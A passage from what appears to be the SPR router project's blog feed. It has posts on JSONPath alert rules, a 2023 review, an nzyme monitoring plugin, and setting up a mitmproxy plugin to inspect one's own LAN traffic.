        <id>https://www.supernetworks.org/pages/blog/spr-2024-alerts</id>
        <link href="https://www.supernetworks.org/pages/blog/spr-2024-alerts"/>
        <updated>2024-01-31T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Alerting Made Easy]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="alerting-made-easy">Alerting Made Easy<a href="https://www.supernetworks.org/pages/blog/spr-2024-alerts#alerting-made-easy" class="hash-link" aria-label="Direct link to Alerting Made Easy" title="Direct link to Alerting Made Easy">​</a></h2>
<p>We've rolled out a lightweight alerting mechanism built right inside of SPR.</p>
<p>So SPR already has an event system and we wanted to improve the existing notification system
as well as persist alerts for later.</p>
<p>We wanted something with the following properties:</p>
<ul>
<li>Allow powerful matching expressions</li>
<li>Work with our lightweight key-value database for concurrent access</li>
<li>Minimal system performance impact</li>
<li>User Customizable, in UX with minimal coding</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-stack">The stack<a href="https://www.supernetworks.org/pages/blog/spr-2024-alerts#the-stack" class="hash-link" aria-label="Direct link to The stack" title="Direct link to The stack">​</a></h2>
<p>We carry extensive experience building threat detection products in the infosec space.
Typically these have been substantial systems where event and graph databases manage petabytes of information,
and reports get generated as part of data pipelines or by processing during ingestion.</p>
<p>We wanted to keep it simple. So this is the stack we've settled on for alerts:</p>
<ul>
<li>Run alert matching during event ingestion</li>
<li>Keep using BoltDB as a KV which scales well and is already built</li>
<li>Use  <code>PaesslerAG/jsonpath</code> and <code>gval</code> for JSONPath expressions and evaluation</li>
<li>Extensible later with custom operators and functions. We get this from <code>gval</code></li>
<li>UX with our React frontend</li>
</ul>
<p>For advanced users, exporting to InfluxDB, Splunk, or ELK can be done with the <code>sprbus</code> tools or by pulling the API for events,
so threat detection experts can integrate SPR data into more sophisticated detection tools.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="expression-matching-with-jsonpath">Expression Matching with JSONPath<a href="https://www.supernetworks.org/pages/blog/spr-2024-alerts#expression-matching-with-jsonpath" class="hash-link" aria-label="Direct link to Expression Matching with JSONPath" title="Direct link to Expression Matching with JSONPath">​</a></h2>
<p>Let's quickly take a tour of <a href="https://www.jsonpath.com/" target="_blank" rel="noopener noreferrer">JSONPath</a>.</p>
<p><img decoding="async" loading="lazy" alt="alerts-custom" src="https://www.supernetworks.org/pages/assets/images/jsonpath-image-8ef8e05fe413ef9ceb88e276a1a282bd.jpg" width="800" height="419" class="img_ev3q"></p>
<p>JSONPath is a query syntax for matching fields of a JSON Object.</p>
<p>Consider the event below</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">{</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  "MAC": "30:58:90:32:7d:e5",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  "Reason": "mismatch",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  "Status": "",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  "Type": "wpa",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  "time": "2024-02-02T04:10:19.511662376Z",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  "bucket": "wifi:auth:fail",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  "MeaningOfLife": 42</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To retrieve the <code>MeaningOfLife</code> field, we can construct the following path:</p>
<p><code>$.MeaningOfLife</code> which returns <code>42</code>.</p>
<p>Looking at the basic operators for JSONPath, its very much built to recurse objects and iterate through arrays.
<img decoding="async" loading="lazy" alt="alerts-custom" src="https://www.supernetworks.org/pages/assets/images/jsonpath-com-6305b9073dcaaccfd840112a45dc3895.jpg" width="2568" height="856" class="img_ev3q"></p>
<p>So suppose we have an array of events, we can build a filter expression to query for matches.</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">[</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    "MAC": "30:58:90:32:7d:e5",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    "Reason": "mismatch",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    "Status": "",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    "Type": "wpa",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    "time": "2024-02-02T04:10:19.511662376Z",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    "bucket": "wifi:auth:fail",</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    "MeaningOfLife": 42</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To pull out events with MeaningOfLife 42, we would apply this query:</p>
<div class="language-JSONPath language-jsonpath codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsonpath codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$[?(@.MeaningOfLife==42)]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We could also use other mathematical comparisons</p>
<div class="language-JSONPath language-jsonpath codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsonpath codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$[?(@.MeaningOfLife&gt;0)]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Or with gval we can even add numbers</p>
<div class="language-JSONPath language-jsonpath codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsonpath codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$[?(@.MeaningOfLife&gt;(1+10))]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Other useful ways to match are regular expressions on strings:</p>
<div class="language-JSONPath language-jsonpath codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsonpath codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$[?(@.Reason=~"^mismatch$")]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="jsonpath-in-spr">JSONPath in SPR<a href="https://www.supernetworks.org/pages/blog/spr-2024-alerts#jsonpath-in-spr" class="hash-link" aria-label="Direct link to JSONPath in SPR" title="Direct link to JSONPath in SPR">​</a></h3>
<p>The best part is we don't need a SQL schema to get started. JSONPath work for all of the events in SPR.
It may seem a bit intimidating at first, and we hide out some of the extra syntax <code>$[?@(.)]</code>. However,
this provides a lot of flexibility and is relatively easy once you get the hang of it.</p>
<p><img decoding="async" loading="lazy" alt="alerts-custom" src="https://www.supernetworks.org/pages/assets/images/alert-custom-5193040408fcedefce9a3c9d82bea448.png" width="2826" height="2014" class="img_ev3q"></p>
<p>To simplify rule writing we allow multiple JSONPath queries and provide toggles
for inverting logic as well as Match One (OR) or Match Any (AND). Each JSONPath query can match on multiple fields too.</p>
<p>The JSONPath query language is also available under the events search view for searching.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="customizability--decorators">Customizability &amp; Decorators<a href="https://www.supernetworks.org/pages/blog/spr-2024-alerts#customizability--decorators" class="hash-link" aria-label="Direct link to Customizability &amp; Decorators" title="Direct link to Customizability &amp; Decorators">​</a></h2>
<p>Alerts can Notify in the UI or they can sit on the Alerts page for triaging. When defining an alert,
users can fill out the 'Title' and 'Body' for the alert to display. These support a templating language,
for populating text with fields from the Alert Event. Furthermore, we've added a few decorators with hashtags
to convert identifiers to device icons or go from something like a MAC address to a device name or IP Address.</p>
<p>Templates expand event fields inside of curly brackets as elow:
<code> MAC Mismatch IP Violation {{IP.SrcIP#Device}} {{IP.SrcIP}} {{Ethernet.SrcMAC}} to {{IP.DstIP}} {{Ethernet.DstMAC}}</code></p>
<p>Check out the guide for more details about <a href="https://www.supernetworks.org/pages/docs/guides/alerts">how to configure alerts</a>.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="need-a-feature">Need a feature?<a href="https://www.supernetworks.org/pages/blog/spr-2024-alerts#need-a-feature" class="hash-link" aria-label="Direct link to Need a feature?" title="Direct link to Need a feature?">​</a></h2>
<p>If you'd like to see more added or have a question, don't hesitate to file a github issue or reach out on our discord</p>
<p><img decoding="async" loading="lazy" alt="alerts-overview" src="https://www.supernetworks.org/pages/assets/images/alerts-overview-d5e7da7dec59633aa0c6ddc31986bf74.png" width="2880" height="1562" class="img_ev3q"></p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="SPR" term="SPR"/>
        <category label="alerts" term="alerts"/>
        <category label="jpath" term="jpath"/>
        <category label="events" term="events"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[2023 Year in Review]]></title>
        <id>https://www.supernetworks.org/pages/blog/spr-2023-in-review</id>
        <link href="https://www.supernetworks.org/pages/blog/spr-2023-in-review"/>
        <updated>2023-12-27T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[What a year it's been for the Secure Programmable Router (SPR) project! We've made great strides in empowering users to take control of their networks, prioritize privacy, and unlock network configurability. Let's dive right into the highlights of 2023 and peek at what's in store for the future.]]></summary>
        <content type="html"><![CDATA[<p><strong>What a year it's been for the Secure Programmable Router (SPR) project!</strong> We've made great strides in empowering users to take control of their networks, prioritize privacy, and unlock network configurability. Let's dive right into the highlights of 2023 and peek at what's in store for the future.</p>
<p><img decoding="async" loading="lazy" alt="device-list" src="https://www.supernetworks.org/pages/assets/images/demo-screenshot-4fada3be970ecc66a3ac005cc64907e2.png" width="3002" height="1370" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="major-accomplishments">Major Accomplishments:<a href="https://www.supernetworks.org/pages/blog/spr-2023-in-review#major-accomplishments" class="hash-link" aria-label="Direct link to Major Accomplishments:" title="Direct link to Major Accomplishments:">​</a></h3>
<ul>
<li><strong>iOS App Launch:</strong> We've extended network management to your fingertips with the release of our official <a href="https://apps.apple.com/us/app/secure-programmable-router/id6443709201" target="_blank" rel="noopener noreferrer">iOS app on the App Store</a>. We're thankful to our users from almost each and every region on the App Store.</li>
<li><strong>PLUS Membership:</strong> Our community now has the option to support the project <a href="https://www.supernetworks.org/plus.html" target="_blank" rel="noopener noreferrer">with PLUS</a> and unlock advanced features like:<!-- -->
<ul>
<li>Mesh networking for seamless coverage with multiple APs</li>
<li>Site VPN support for selectively routing traffic through a remote Wireguard VPN</li>
<li>Advanced firewall rules with scheduling, domain name, and regular expression support</li>
</ul>
</li>
<li><strong>Shipping Dev Kits</strong>. After the global supply chain crunch, we're proud to be shipping <a href="https://www.supernetworks.org/devkit.html" target="_blank" rel="noopener noreferrer">dev kits</a> to users</li>
<li><strong>Microsegmentation for Containers:</strong> We've taken SPR's container support to the next level with integrated container microsegmentation, enabling granular control over container and interface traffic.</li>
<li><strong>VLAN Trunk Support:</strong> SPR can work as a wired firewall as well. Connect devices to your SPR network securely through a managed switch, with SPR terminating a VLAN Trunk Port.</li>
<li><strong>Expanded Network Visibility:</strong> Our new <a href="https://github.com/spr-networks/sprbus" target="_blank" rel="noopener noreferrer">event bus</a>, database, and configurable alerting mechanism provide key insights into network activity, empowering users to detect and troubleshoot issues effectively and analyze IOT &amp; device traffic.</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="thank-you-to-our-users">Thank you to our users!<a href="https://www.supernetworks.org/pages/blog/spr-2023-in-review#thank-you-to-our-users" class="hash-link" aria-label="Direct link to Thank you to our users!" title="Direct link to Thank you to our users!">​</a></h3>
<ul>
<li>
<p><strong>We Build For You:</strong> We're incredibly grateful for our active user base and their invaluable suggestions. Your feedback drives our development roadmap! Join the conversation on Discord or create a GitHub request to share your ideas. Many of SPR's capabilities come from requests. Some of the feature requests that have landed are wifi scanning from the UI, the <code>lan_upstream</code> tag for restricting and managing access to upstream local networks to enable <a href="https://www.supernetworks.org/pages/blog/secure%20router%20chaining" target="_blank" rel="noopener noreferrer">secure router chaining</a>, and load balancing support across multiple Uplink interfaces.</p>
</li>
<li>
<p><strong>Privacy and Ad Blocking Excellence:</strong> SPR continues to excel as a self-hosted WireGuard + DNS Ad block solution, offering unmatched configurability with per-device rules, easy exception management, and upstream DNS over HTTPS support for enhanced privacy. Users can get these capabilities by <a href="https://www.supernetworks.org/pages/blog/virtual-spr-1click" target="_blank" rel="noopener noreferrer">self hosting in the cloud</a> as well as running SPR at home as a router.</p>
</li>
<li>
<p><strong>Network Debugging Made Easy:</strong> Users have been able to use SPR to successfully debug connectivity issues with devices like Ring cameras, pinpointing problems with Amazon's cloud services rather than home Wi-Fi although Ring may say otherwise.</p>
</li>
<li>
<p><strong>Uncovering Unauthorized Access:</strong> Event logs have helped users identify and address unauthorized access attempts, including scenarios like accidental connections from new neighbors moving in.</p>
</li>
<li>
<p><strong>Speedier WiFi:</strong> Even with our Raspberry Pi dev kits, users report impressive speeds between <code>500-700 Mbps</code> over USB3, surpassing their previous routers. With MT7915/6 cards, SPR users today can enjoy actual WiFi 6 gigabit <code>(1000+ Mbps)</code> connectivity over 2 spatial streams as measured with iperf3.</p>
</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="technical-research">Technical Research:<a href="https://www.supernetworks.org/pages/blog/spr-2023-in-review#technical-research" class="hash-link" aria-label="Direct link to Technical Research:" title="Direct link to Technical Research:">​</a></h3>
<ul>
<li>
<p><strong>Unscathed by MacStealer:</strong> SPR's design was further validated by the <a href="https://github.com/vanhoefm/macstealer" target="_blank" rel="noopener noreferrer">MacStealer (CVE-2022-47522)</a> flaws. MacStealer bypassed most Client Isolation approaches due to state errors in low level firmware with MAC address handling. SPR's per-device VLAN and per-device password approach is totally immune to this category of protocol flaws.</p>
</li>
<li>
<p><strong>Research AP in Scapy:</strong> We've developed functional WPA2 AP research scripts in Scapy for working with Wi-Fi frames, compatible with mac80211_hwsim and real wireless cards. (<a href="https://github.com/spr-networks/barely-ap" target="_blank" rel="noopener noreferrer">https://github.com/spr-networks/barely-ap</a>).</p>
</li>
<li>
<p><strong>Turtles WiFi Hacking</strong> While waiting for the supply chain to unlock at the start of the year, we put together some wifi security training focused on protocol. We actually let people boot a kernel for a self hosted wireless lab, in the browser. Or people can play offline in containers. This is a bit different than other labs which teach people to run prebuilt software as we guide people towards working at the packet level. <a href="https://www.supernetworks.org/wifiturtles.html" target="_blank" rel="noopener noreferrer">Check it out here</a></p>
</li>
</ul>
<p><img decoding="async" loading="lazy" alt="device-list" src="https://www.supernetworks.org/pages/assets/images/turtles-5733351d9bbcd250b9fa7b3f4c034ea5.png" width="3106" height="2028" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2023s-hardware-in-pictures">2023's Hardware In Pictures<a href="https://www.supernetworks.org/pages/blog/spr-2023-in-review#2023s-hardware-in-pictures" class="hash-link" aria-label="Direct link to 2023's Hardware In Pictures" title="Direct link to 2023's Hardware In Pictures">​</a></h3>
<p><img decoding="async" loading="lazy" alt="pi4" src="https://www.supernetworks.org/pages/assets/images/yellow-pi-case-a6d3fa980bc9e4e7dba63b83781bc34e.png" width="1200" height="1200" class="img_ev3q">
<em>Pi4 with a Mediatek MT76-based USB3 Adapter</em></p>
<p><img decoding="async" loading="lazy" alt="pi4" src="https://www.supernetworks.org/pages/assets/images/clearfog-6795a1eac2a1694b5731b8ee02677e84.png" width="3728" height="1182" class="img_ev3q">
<em>Solidrun Clearfog Dev Kit</em></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-road-ahead">The Road Ahead:<a href="https://www.supernetworks.org/pages/blog/spr-2023-in-review#the-road-ahead" class="hash-link" aria-label="Direct link to The Road Ahead:" title="Direct link to The Road Ahead:">​</a></h3>
<ul>
<li><strong>Empowering Plugins:</strong> Our next major focus is facilitating community-built plugins. We've already created prototypes for <a href="https://github.com/spr-networks/spr-tailscale" target="_blank" rel="noopener noreferrer">Tailscale support</a> and <a href="https://github.com/spr-networks/spr-mitmproxy" target="_blank" rel="noopener noreferrer">mitmproxy</a>, and we're working on UI integration and streamlined installation to make plugin usage as seamless as possible without sacrificing security.</li>
<li><strong>PI5 Router with WiFi-6:</strong> Our next hardware device will be a a PI5-based router packaged with wifi-6 support.</li>
<li><strong>Eliminating firmware risk</strong> We're also <a href="https://www.supernetworks.org/pages/blog/barely-ap-surfaces" target="_blank" rel="noopener noreferrer">developing software</a> to eliminate firmware attack surfaces with WiFi.</li>
</ul>
<p><strong>Join the Movement:</strong></p>
<p>We invite you to be part of the SPR journey! Contribute to development, share your feedback, and help us shape the future of open-source networking. Together, we can build a more secure, private, and customizable internet experience for everyone.</p>
<p><strong>Visit our <a href="https://www.supernetworks.rog/" target="_blank" rel="noopener noreferrer">website</a> and <a href="https://github.com/spr-networks/super" target="_blank" rel="noopener noreferrer">GitHub repository</a> to learn more and get involved</strong></p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <author>
            <name>Philip Olausson</name>
            <uri>https://twitter.com/capslcc</uri>
        </author>
        <category label="SPR" term="SPR"/>
        <category label="IOS" term="IOS"/>
        <category label="microsegmentation" term="microsegmentation"/>
        <category label="PLUS" term="PLUS"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Loading an nzyme tap on SPR]]></title>
        <id>https://www.supernetworks.org/pages/blog/spr-nzyme-tap</id>
        <link href="https://www.supernetworks.org/pages/blog/spr-nzyme-tap"/>
        <updated>2023-11-16T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Nzyme lets people monitor their wifi networks with sensors that collect wifi data (as well as network traffic).]]></summary>
        <content type="html"><![CDATA[<p><a href="https://www.nzyme.org/" target="_blank" rel="noopener noreferrer">Nzyme</a> lets people monitor their wifi networks with sensors that collect wifi data (as well as network traffic).</p>
<p>It can detect common wifi attack tools and tactics like deauths for getting WPA2 handshakes to crack,
rogue APs, and more.</p>
<p>We've put together a plugin that can run alongside the SPR AP without affecting the channels, by creating a monitor interface. While this won't be able to detect Rogue APs, it can detect some anomalous activity.</p>
<p>The plugin is available at <a href="https://github.com/spr-networks/spr-nzyme-tap/" target="_blank" rel="noopener noreferrer">https://github.com/spr-networks/spr-nzyme-tap/</a></p>]]></content>
        <author>
            <name>Alex Radocea</name>
            <uri>https://twitter.com/defendtheworld</uri>
        </author>
        <category label="wifi" term="wifi"/>
        <category label="nzyme" term="nzyme"/>
        <category label="defense" term="defense"/>
        <category label="blue-team" term="blue-team"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Transparent Socket Forwarding with SPR and MITMProxy]]></title>
        <id>https://www.supernetworks.org/pages/blog/spr-mitmproxy</id>
        <link href="https://www.supernetworks.org/pages/blog/spr-mitmproxy"/>
        <updated>2023-11-14T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Update]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="update">Update<a href="https://www.supernetworks.org/pages/blog/spr-mitmproxy#update" class="hash-link" aria-label="Direct link to Update" title="Direct link to Update">​</a></h2>
<p>This post has become a guide which is being kept up to date, <a href="https://www.supernetworks.org/pages/docs/guides_plus/mitmproxy">check it out!</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="overview">Overview<a href="https://www.supernetworks.org/pages/blog/spr-mitmproxy#overview" class="hash-link" aria-label="Direct link to Overview" title="Direct link to Overview">​</a></h2>
<p>In this post we'll show how PLUS members can add a <code>mitmproxy</code> plugin to their SPR setup,
and then use the <a href="https://www.supernetworks.org/plus.html" target="_blank" rel="noopener noreferrer">Programmable Firewall (PFW)</a> plugin to redirect traffic through <code>mitmproxy</code> with DNAT forwarding.</p>
<p>We do not need to configure our clients with proxy settings to point to <code>mitmproxy</code>, or rewrite DNS responses,
since we are using the PFW feature to do the redirection.</p>
<p><a href="https://github.com/spr-networks/spr-mitmproxy" target="_blank" rel="noopener noreferrer">This plugin is available on github.</a></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="prepare-the-plugin">Prepare the plugin<a href="https://www.supernetworks.org/pages/blog/spr-mitmproxy#prepare-the-plugin" class="hash-link" aria-label="Direct link to Prepare the plugin" title="Direct link to Prepare the plugin">​</a></h3>
<p>from the SPR directory, typically <code>/home/spr/super</code></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd plugins</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">git clone https://github.com/spr-networks/spr-mitmproxy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">echo [\"plugins/spr-mitmproxy/docker-compose.yml\"] &gt; ../configs/base/custom_compose_paths.json</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">cd spr-mitmproxy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">docker compose build</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="configure-spr">Configure SPR<a href="https://www.supernetworks.org/pages/blog/spr-mitmproxy#configure-spr" class="hash-link" aria-label="Direct link to Configure SPR" title="Direct link to Configure SPR">​</a></h3>
<ol>
<li>Navigate to the SPR UI. Add mitmproxy under the Plugins page</li>
</ol>
<ul>
<li>be sure its been added to <code>configs/base/custom_compose_paths.json</code> as above</li>
<li>Enable it by toggling the slider
<img decoding="async" loading="lazy" src="https://github.com/spr-networks/spr-mitmproxy/assets/37549748/dcc0f1ea-724a-4ed0-856a-56444ea2569f" alt="" class="img_ev3q"></li>
</ul>
<ol start="2">
<li>Add <code>mitmweb0</code> to the custom interface rules. You can verify your container's network address in the Container tab -&gt;
Under <code>Firewall-&gt; Custom Interface Access</code> Add a new rule, make sure mitmproxy has <code>wan</code> at least to access the internet.</li>
</ol>
<p><img decoding="async" loading="lazy" src="https://github.com/spr-networks/spr-mitmproxy/assets/37549748/71d4c8c9-3812-452f-86df-a7d19fb703a6" alt="" class="img_ev3q"></p>
<ol start="3">
<li>
<p>Create a forwarding rule to the container web interface :8081. Pick an arbitrary IP in the subnet -- although not the same one as the container as that confuses dnat.
<img decoding="async" loading="lazy" src="https://github.com/spr-networks/spr-mitmproxy/assets/37549748/ff1424c6-b6ad-48d4-8ffe-03186f61abc6" alt="" class="img_ev3q"></p>
</li>
<li>
<p>Create a site forward rule with PFW for traffic to intercept
<img decoding="async" loading="lazy" src="https://github.com/spr-networks/spr-mitmproxy/assets/37549748/4d5e49b4-5860-4aad-ac17-510589ee31c5" alt="" class="img_ev3q"></p>
</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="using-mitmproxy">Using mitmproxy<a href="https://www.supernetworks.org/pages/blog/spr-mitmproxy#using-mitmproxy" class="hash-link" aria-label="Direct link to Using mitmproxy" title="Direct link to Using mitmproxy">​</a></h3>
<p>Then make a curl request from any of the LAN devices, and it should populate on the mitmweb host. This was the :8081 host that was earlier defined
<img decoding="async" loading="lazy" src="https://github.com/spr-networks/spr-mitmproxy/assets/37549748/a70a9f7e-91b9-4798-926b-2cb625f71e78" alt="" class="img_ev3q"></p>
